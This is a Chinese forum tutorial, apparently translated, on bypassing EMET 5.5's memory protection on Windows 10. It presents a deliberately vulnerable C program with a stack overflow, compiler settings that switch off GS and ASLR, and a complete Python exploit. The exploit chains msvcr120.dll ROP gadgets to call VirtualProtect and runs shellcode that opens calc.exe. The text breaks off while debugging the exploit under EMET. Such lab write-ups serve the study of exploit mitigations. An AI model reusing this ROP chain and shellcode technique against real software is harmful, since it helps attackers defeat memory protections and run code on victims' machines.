
# [原创]win10下EMET 5.5防护机制之Memport的绕过

原文链接：[476K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3g2^5M7r3c8W2N6W2)9J5k6r3E0A6N6h3S2F1L8g2)9J5k6i4u0Z5j5$3I4G2N6h3c8Q4x3X3g2U0L8$3#2Q4x3V1j5J5x3o6p5#2i4K6u0r3x3o6g2Q4x3V1j5J5z5g2)9J5c8X3g2E0k6i4c8Q4x3X3b7#2i4K6u0V1x3W2)9J5k6o6u0Q4x3V1j5`.](https://bbs.kanxue.com/elink@e28K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3g2^5M7r3c8W2N6W2)9J5k6r3E0A6N6h3S2F1L8g2)9J5k6i4u0Z5j5$3I4G2N6h3c8Q4x3X3g2U0L8$3#2Q4x3V1j5J5x3o6p5#2i4K6u0r3x3o6g2Q4x3V1j5J5z5g2)9J5c8X3g2E0k6i4c8Q4x3X3b7#2i4K6u0V1x3W2)9J5k6o6u0Q4x3V1j5`.)

翻译链接：<http://bbs.pediy.com/showthread.php?t=207189>

本文实验环境为win10，如果是win7，则会与原文保持一样的结果。

## EMET 简介

首先介绍一下EMET：

1. 数据执行保护(`DEP`)

    如果指令位于被标记为不可执行的内存区域,就阻止它们的执行.

2. 结构化异常处理程序覆盖保护(`SEHOP`)

    对覆盖 Windows 结构化异常处理程序的漏洞利用技术进行防御.

3. 空页面保护(`NullPage`)

    预分配空页面,防止攻击者利用它来进行恶意利用.

4. 堆喷射保护(`HeapSpray`)

    将通常被攻击者用来分配恶意代码的内存区域预先分配了.(例如,`0x0a040a04`;`0x0a0a0a0a`;`0x0b0b0b0b`;`0x0c0c0c0c`;`0x0d0d0d0d`;`0x0e0e0e0e`;`0x04040404`;`0x05050505`;`0x06060606`;`0x07070707`;`0x08080808`;`0x09090909`;`0x20202020`;`0x14141414`)

5. 导出地址表访问过滤(`EAF`)

    可以对访问导出地址表(`EAT`)的调用代码设置规则.

6. 导出地址表访问过滤增强版(`EAF+`)

    阻止掉常被用于漏洞利用过程中通过读取导入,导出表来获取常见模块中 API 函数地址的操作.

7. 强制地址空间布局随机化(`MandatoryASLR`)

    通过随机化模块加载到内存中的位置,以此来限制攻击者预先确定内存地址的能力.

8. 由低而上的地址空间布局随机化(`BottomUpASLR`)

    通过随机化自下而上分配的基地址来增强强制性地址空间布局随机化(`MandatoryASLR`)的缓解性(`Mitigation`).

9. `Load Library` 保护(`LoadLib`)

    阻止掉位于 `UNC` 通用命名规则 路径下的模块(即,\\evilsite\bad.dll)-返回导向编程(`ROP`)攻击中的通用技术.

10. 内存保护(`MemProt`)

    阻止掉将位于栈中的内存空间标记为可执行的操作-返回导向编程(`ROP`)攻击中的通用技术.

11. `ROP` 调用者检查(`Caller`)

    阻止掉直接通过一个 `RET` 指令来调用的判定/关键函数的执行-返回导向编程(`ROP`)攻击中的通用技术.

12. `ROP` 模拟执行流(`SimExecFlow`)

    在返回地址后再生一个执行流,尝试检测返回导向编程(`ROP`)攻击.

13. 堆栈支点(`StackPivot`)

    检查栈指针是否被修改,转而去指向攻击者控制的内存区域了-返回导向编程(`ROP`)攻击中的通用技术.

14. 减少攻击面(`ASR`)

    防止规定的模块加载到受保护进程的地址空间.

## 实验程序代码

接下来是我们实验用的程序代码：

```
#include <cstdio>
#include <Windows.h>
#include <conio.h>

_declspec(noinline) int f() {
    char name[32];
    printf("Reading name from file...\n");
    LoadLibrary(L"msvcr120.dll");//原文并没有这个，但是没有这个，我们的程序不会加载这个模块，由于我们要用到这个模块，所以我手动加载了^-^
    FILE *f = fopen("c:\\tmp\\name.dat", "rb");
    if (!f)
        return -1;
    fseek(f, 0L, SEEK_END);
    long bytes = ftell(f);
    fseek(f, 0L, SEEK_SET);
    fread(name, 1, bytes, f);//这就是我们的溢出点了
    name[bytes] = '\0';
    fclose(f);
    printf("Hi, %s!\n", name);
	getch();
    return 0;
}

int main() {
    char moreStack[10000];//避免我们的payload太大，导致文件读取的时候出错
    for (int i = 0; i < sizeof(moreStack); ++i)
        moreStack[i] = i;

    return f();
}
```

然后开始设置我们的编译条件：关闭`GS`，开启`DEP`，关闭`ASLR`（因为要解决`ASLR`需要一些信息泄露）：

项目-》属性-》配置属性-》`c/c++`-》代码生成-》缓冲区安全检查（`NO`）

项目-》属性-》配置属性-》链接器-》高级-》数据执行保护（`YES`）`and`随机基质（`NO`）

![](https://bbs.kanxue.com/upload/attach/201603/674429_k1bbi9g05usgiyf.png)

好了，编译完后，先让我们获取一下`msvcr120.dll`的基址。因为该模块是有`aslr`的，所以每次加载的时候基址都会变。

```
#include <windows.h>
#include <conio.h>
int main() {
	HMODULE hMod =LoadLibrary("msvcr120.dll");
printf("msvcr120 = %08x\n", hMod);
printf("--- press any key ---\n");
_getch();
return 0;
}
```

获取了基址后应用到下面的脚本中：

```
import struct

# The signature of VirtualProtect is the following:
#   BOOL WINAPI VirtualProtect(
#     _In_   LPVOID lpAddress,
#     _In_   SIZE_T dwSize,
#     _In_   DWORD flNewProtect,
#     _Out_  PDWORD lpflOldProtect
#   );

# After PUSHAD is executed, the stack looks like this:
#   .
#   .
#   .
#   EDI (ptr to ROP NOP (RETN))
#   ESI (ptr to JMP [EAX] (EAX = address of ptr to VirtualProtect))
#   EBP (ptr to POP (skips EAX on the stack))
#   ESP (lpAddress (automatic))
#   EBX (dwSize)
#   EDX (NewProtect (0x40 = PAGE_EXECUTE_READWRITE))
#   ECX (lpOldProtect (ptr to writeable address))
#   EAX (address of ptr to VirtualProtect)
# lpAddress:
#   ptr to "call esp"
#   <shellcode>

msvcr120 = 0x605a0000#[B]这里是我们实际获得的地址，使用时需要修改这个值[/B]

# Delta used to fix the addresses based on the new base address of msvcr120.dll.
md = msvcr120 - 0x70480000


def create_rop_chain(code_size):
    rop_gadgets = [
      md + 0x7053fc6f,  # POP EBP # RETN [MSVCR120.dll]
      md + 0x7053fc6f,  # skip 4 bytes [MSVCR120.dll]
      md + 0x704f00f6,  # POP EBX # RETN [MSVCR120.dll]
      code_size,        # code_size -> ebx
      md + 0x704b6580,  # POP EDX # RETN [MSVCR120.dll]
      0x00000040,       # 0x00000040-> edx
      md + 0x7049f8cb,  # POP ECX # RETN [MSVCR120.dll]
      md + 0x705658f2,  # &Writable location [MSVCR120.dll]
      md + 0x7048f95c,  # POP EDI # RETN [MSVCR120.dll]
      md + 0x7048f607,  # RETN (ROP NOP) [MSVCR120.dll]
      md + 0x704eb436,  # POP ESI # RETN [MSVCR120.dll]
      md + 0x70493a17,  # JMP [EAX] [MSVCR120.dll]
      md + 0x7053b8fb,  # POP EAX # RETN [MSVCR120.dll]
      md + 0x705651a4,  # ptr to &VirtualProtect() [IAT MSVCR120.dll]
      md + 0x7053b7f9,  # PUSHAD # RETN [MSVCR120.dll]
      md + 0x704b7e5d,  # ptr to 'call esp' [MSVCR120.dll]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)


def write_file(file_path):
    with open(file_path, 'wb') as f:
        ret_eip = md + 0x7048f607       # RETN (ROP NOP) [MSVCR120.dll]
        shellcode = (
            "\xe8\xff\xff\xff\xff\xc0\x5f\xb9\x11\x03\x02\x02\x81\xf1\x02\x02" +
            "\x02\x02\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x02\x0f\x44\xc6\xaa" +
            "\xe2\xf6\x55\x8b\xec\x83\xec\x0c\x56\x57\xb9\x7f\xc0\xb4\x7b\xe8" +
            "\x55\x02\x02\x02\xb9\xe0\x53\x31\x4b\x8b\xf8\xe8\x49\x02\x02\x02" +
            "\x8b\xf0\xc7\x45\xf4\x63\x61\x6c\x63\x6a\x05\x8d\x45\xf4\xc7\x45" +
            "\xf8\x2e\x65\x78\x65\x50\xc6\x45\xfc\x02\xff\xd7\x6a\x02\xff\xd6" +
            "\x5f\x33\xc0\x5e\x8b\xe5\x5d\xc3\x33\xd2\xeb\x10\xc1\xca\x0d\x3c" +
            "\x61\x0f\xbe\xc0\x7c\x03\x83\xe8\x20\x03\xd0\x41\x8a\x01\x84\xc0" +
            "\x75\xea\x8b\xc2\xc3\x8d\x41\xf8\xc3\x55\x8b\xec\x83\xec\x14\x53" +
            "\x56\x57\x89\x4d\xf4\x64\xa1\x30\x02\x02\x02\x89\x45\xfc\x8b\x45" +
            "\xfc\x8b\x40\x0c\x8b\x40\x14\x8b\xf8\x89\x45\xec\x8b\xcf\xe8\xd2" +
            "\xff\xff\xff\x8b\x3f\x8b\x70\x18\x85\xf6\x74\x4f\x8b\x46\x3c\x8b" +
            "\x5c\x30\x78\x85\xdb\x74\x44\x8b\x4c\x33\x0c\x03\xce\xe8\x96\xff" +
            "\xff\xff\x8b\x4c\x33\x20\x89\x45\xf8\x03\xce\x33\xc0\x89\x4d\xf0" +
            "\x89\x45\xfc\x39\x44\x33\x18\x76\x22\x8b\x0c\x81\x03\xce\xe8\x75" +
            "\xff\xff\xff\x03\x45\xf8\x39\x45\xf4\x74\x1e\x8b\x45\xfc\x8b\x4d" +
            "\xf0\x40\x89\x45\xfc\x3b\x44\x33\x18\x72\xde\x3b\x7d\xec\x75\x9c" +
            "\x33\xc0\x5f\x5e\x5b\x8b\xe5\x5d\xc3\x8b\x4d\xfc\x8b\x44\x33\x24" +
            "\x8d\x04\x48\x0f\xb7\x0c\x30\x8b\x44\x33\x1c\x8d\x04\x88\x8b\x04" +
            "\x30\x03\xc6\xeb\xdd")
        code_size = len(shellcode)
        name = 'a'*36 + struct.pack('<I', ret_eip) + create_rop_chain(code_size) + shellcode
        f.write(name)

write_file(r'c:\tmp\name.dat')#你可以自己修改文件地址，注意要和前面的cpp文件一致
```

如果一切都没有问题，那么运行上面的`python`脚本后，再打开我们的程序，就会弹出计算器了^\_^。

## EMET 测试

接下来下载`EMET 5.5`[51fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8%4N6F1L8r3!0S2k6q4)9J5k6h3#2A6j5%4u0G2M7$3!0X3N6q4)9J5k6h3y4G2L8g2)9J5c8X3c8G2N6$3&6D9L8$3q4V1i4K6u0r3z5q4)9J5c8V1g2Q4x3V1k6q4i4K6u0r3z5p5g2q4c8V1b7&6c8V1y4Q4x3X3b7@1y4V1t1I4i4K6u0V1y4p5p5^5b7W2)9J5k6o6W2n7y4f1c8Q4x3X3b7I4x3@1t1@1x3K6j5#2c8U0S2o6b7e0m8Q4x3V1k6q4e0f1g2f1i4K6t1#2x3U0m8e0k6i4c8#2M7q4)9J5k6h3#2K6K9b7`.`.](https://bbs.kanxue.com/elink@0d1K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8%4N6F1L8r3!0S2k6q4)9J5k6h3#2A6j5%4u0G2M7$3!0X3N6q4)9J5k6h3y4G2L8g2)9J5c8X3c8G2N6$3&6D9L8$3q4V1i4K6u0r3z5q4)9J5c8V1g2Q4x3V1k6q4i4K6u0r3z5p5g2q4c8V1b7&6c8V1y4Q4x3X3b7@1y4V1t1I4i4K6u0V1y4p5p5^5b7W2)9J5k6o6W2n7y4f1c8Q4x3X3b7I4x3@1t1@1x3K6j5#2c8U0S2o6b7e0m8Q4x3V1k6q4e0f1g2f1i4K6t1#2x3U0m8e0k6i4c8#2M7q4)9J5k6h3#2K6K9b7`.`.)

然后在左上方的`apps`里面选择 `add application`，把我们编译的文件添加进去，并勾选除`EAF`，`EAF+`和`ASR`、`fonts`的所有选项。当然了，关键还是那个`Memport`。

然后再运行我们的程序，发现最后崩溃了。怎么回事呢，打开`ImmunityDebugger`跟进到`f`函数的`ret`处，单步执行直到`pushad`，`retn`后，会得到如下的情况
